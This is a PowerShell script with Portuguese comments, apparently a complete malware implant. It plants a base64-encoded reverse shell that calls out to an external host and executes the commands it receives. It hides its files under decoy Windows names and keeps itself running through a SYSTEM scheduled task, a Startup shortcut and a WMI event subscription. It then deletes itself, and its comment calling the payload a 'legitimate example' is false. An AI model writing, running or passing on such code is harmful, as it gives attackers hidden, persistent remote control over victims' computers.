












# Configuração inicial SILENCIOSA
$LogDir = "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache"
$TempDir = "$env:TEMP\Windows\TempLogs"

# Criação de diretórios com atributos ocultos
@($LogDir, $TempDir) | ForEach-Object {
    if (-not (Test-Path $_)) {
        $null = New-Item -ItemType Directory -Path $_ -Force
        (Get-Item $_).Attributes = 'Hidden', 'System', 'Directory'
    }
}

# Código que será executado (exemplo legítimo)
$Payload = @'
$e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',3060);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
'@

# Gerar nome aleatório para o script
$ScriptName = "CacheManager_" + (Get-Date -Format "yyyyMMdd") + ".ps1"
$ScriptPath = "$LogDir\$ScriptName"

# Salvar script ofuscado
$Obfuscated = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
"# Encoded script`n`$code=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$Obfuscated'));Invoke-Expression `$code" | 
    Out-File -FilePath $ScriptPath -Encoding UTF8

# MÉTODO PRINCIPAL: Tarefa Agendada (mais discreto)
$TaskName = "DeviceMetadataMaintenance"
$TaskDescription = "Manutenção automática de metadados de dispositivos"

# Criar ação com atraso aleatório
$ActionArgs = @(
    "-WindowStyle Hidden",
    "-ExecutionPolicy Bypass",
    "-Command `"Start-Sleep -Seconds $(Get-Random -Minimum 45 -Maximum 120);",
    "if (Test-Path '$ScriptPath') {",
    "    `$content = Get-Content '$ScriptPath' -Raw;",
    "    if (`$content -match '^# Encoded script') {",
    "        Invoke-Expression `$content",
    "    }",
    "}`""
) -join ' '

$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $ActionArgs

# Trigger com várias condições
$Trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
$Trigger.RandomDelay = "PT1H"  # Atraso aleatório de até 1 hora

# Configurações avançadas
$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -StartWhenAvailable `
    -MultipleInstances IgnoreNew `
    -ExecutionTimeLimit "PT4H" `
    -Priority 7

# Principal com permissões limitadas
$Principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Limited

# Registrar tarefa (silenciosamente)
try {
    $null = Register-ScheduledTask `
        -TaskName $TaskName `
        -Action $Action `
        -Trigger $Trigger `
        -Settings $Settings `
        -Principal $Principal `
        -Description $TaskDescription `
        -Force `
        -ErrorAction Stop
    
    # Limpar histórico de execução
    Get-ScheduledTask -TaskName $TaskName | 
        ForEach-Object { $_.State = 'Disabled'; $_ } | 
        Set-ScheduledTask
    Start-Sleep -Seconds 2
    Get-ScheduledTask -TaskName $TaskName | 
        ForEach-Object { $_.State = 'Ready'; $_ } | 
        Set-ScheduledTask
    
} catch {
    # Fallback: método alternativo menos visível
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsAudio.lnk")
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 300; if (Test-Path '$ScriptPath') { `$c=Get-Content '$ScriptPath' -Raw; iex `$c }`""
    $Shortcut.WindowStyle = 7  # Minimizado
    $Shortcut.Save()
}

# MÉTODO SECUNDÁRIO: Serviço do Usuário (mais resistente)
$ServiceScript = @'
$query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
Register-WmiEvent -Query $query -Action {
    if (Test-Path "CACHED_SCRIPT_PATH") {
        $code = Get-Content "CACHED_SCRIPT_PATH" -Raw
        Invoke-Expression $code
    }
}
'@ -replace "CACHED_SCRIPT_PATH", $ScriptPath

$ServiceScript | Out-File "$TempDir\WmiMonitor.ps1" -Encoding UTF8

# Criar arquivo de configuração para WMI
$FilterArgs = @{
    Name = "SystemTimeFilter"
    EventNameSpace = "root\cimv2"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_LocalTime'"
    QueryLanguage = "WQL"
}

$ConsumerArgs = @{
    Name = "SystemTimeConsumer"
    CommandLineTemplate = "powershell.exe -WindowStyle Hidden -File `"$TempDir\WmiMonitor.ps1`""
}

try {
    $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
    $Consumer = Set-WmiInstance -Class __CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs
    $null = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $Filter
        Consumer = $Consumer
    }
} catch {
    # Silenciar erro
}

# OTIMIZAÇÃO: Limpar rastros do script atual
$currentPath = $MyInvocation.MyCommand.Path
if (Test-Path $currentPath) {
    Start-Job -ScriptBlock {
        param($path)
        Start-Sleep -Seconds 10
        Remove-Item $path -Force -ErrorAction SilentlyContinue
    } -ArgumentList $currentPath | Out-Null
}
